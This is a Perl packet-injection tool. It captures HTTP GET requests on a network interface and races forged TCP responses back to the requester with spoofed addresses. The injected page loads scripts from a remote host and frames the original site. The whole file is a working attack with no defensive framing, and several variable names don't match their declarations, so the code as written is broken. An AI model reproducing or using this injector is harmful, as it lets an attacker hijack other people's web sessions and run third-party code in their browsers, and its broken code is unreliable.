#!/usr/bin/perl
use strict;
use warnings;
use Net::Pcap;
use NetPacket::Ethernet;
use NetPacket::IP;
use NetPacket::TCP;
use Socket;
use Net::RawSock;

my $err;
my $dev = $ARGV[0];

my $html =
"<HTML><HEAD><meta http-equiv='Content-Type' content='text/html; charset=utf-8'/><TITLE>test</TITLE><script type='text/javascript' src='http://xx.yy.zz.88/jquery-1.7.2.js'></script><script></script></HEAD><BODY><iframe name='topIframe' id='topIframe' src='' width='100%' height='100%' marginheight='0' marginwidth='0' frameborder='0' scrolling='no' ></iframe><script type='text/javascript' src='http://xx.yy.zz.88/iframe.js'></script> <script>var u1=window.location.toString();u2=window.location.toString();m=Math.random();ua= window.navigator.userAgent.toLowerCase();f=window.parent.frames['topIframe'];if(u1.indexOf('?')==-1) u1+='?'+m+'='+m;else u1+='&'+m+'='+m;f.location.href=u1;</script></BODY></HTML>";

unless ( defined $dev ) {
    $dev = Net::Pcap::lookupdev( \$err );
    if ( defined $err ) {
        die 'Unable to determine network device for monitoring - ', $err;
    }
}
my ( $address, $netmask );
if ( Net::Pcap::lookupnet( $dev, \$address, \$netmask, \$err ) ) {
    die 'Unable to look up device information for ', $dev, ' - ', $err;
}

my $object;
$object = Net::Pcap::open_live( $dev, 65535, 1, 0, \$err );
unless ( defined $object ) {
    die 'Unable to create packet capture on device ', $dev, ' - ', $err;
}
my $filter;
Net::Pcap::compile( $object, \$filter, '(tcp dst port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0))', 0, $netmask )
  && die 'Unable to compile packet capture filter';
Net::Pcap::setfilter( $object, $filter )
  && die 'Unable to set packet capture filter';

#Set callback function and initiate packet capture loop

Net::Pcap::loop( $object, -1, \&process_packets, '' )
  || die 'Unable to perform packet capture';

Net::Pcap::close($object);

sub process_packets {
    my ( $user_data, $header, $packet ) = @_;

    #Strip ethernet encapsulation of captured packet
    my $ether_data = NetPacket::Ethernet::strip($packet);

    #   Decode contents of TCP/IP packet contained within
    #   captured ethernet packet

    my $ip_in  = NetPacket::IP->decode($ether_data);
    my $tcp_in = NetPacket::TCP->decode( $ip->{'data'} );
    if ( $tcp_in->{'data'} =~ m /GET \/ HTTP/ ) {

## Create IP
        my $ip_out = NetPacket::IP->decode('');

## Init IP
        $ip_out->{ver}     = 4;
        $ip_out->{hlen}    = 5;
        $ip_out->{tos}     = 0;
        $ip_out->{id}      = 0x1d1d;
        $ip_out->{ttl}     = 0x5a;
        $ip_out->{src_ip}  = $ip->{'dest_ip'};
        $ip_out->{dest_ip} = $ip->{'src_ip'};
        $ip_out->{flags}   = 2;

## Create TCP
        my $tcp_out = NetPacket::TCP->decode('');

        my $htmllength = length($html);
## Init TCP
        $tcp_out->{hlen}      = 5;
        $tcp_out->{winsize}   = 0x8e30;
        $tcp_out->{src_port}  = $tcp->{'dest_port'};
        $tcp_out->{dest_port} = $tcp->{'src_port'};
        $tcp_out->{seqnum}    = $tcp->{'acknum'};
        $tcp_out->{acknum}    = $tcp->{'seqnum'} + ( $ip->{'len'} - ( $ip->{'hlen'} + $tcp->{'hlen'} ) * 4 );
        $tcp_out->{flags}     = ACK | PSH | FIN;
        $tcp_out->{data}      = "HTTP/1.1 200 OK\r\n" . "Content-Length: $htmllength" . "\r\nConnection: close\r\nContent-Type:text/html;charset=utf-8\r\n\r\n" . "$html";

# Assemble
        $ip_out->{proto} = 6;
        $ip_out->{data}  = $tcp_out->encode($ip_out);

# Create RAW
        my $pkt = $ip_out->encode;

# Write to network layer
        Net::RawSock::write_ip($pkt);
    }
}
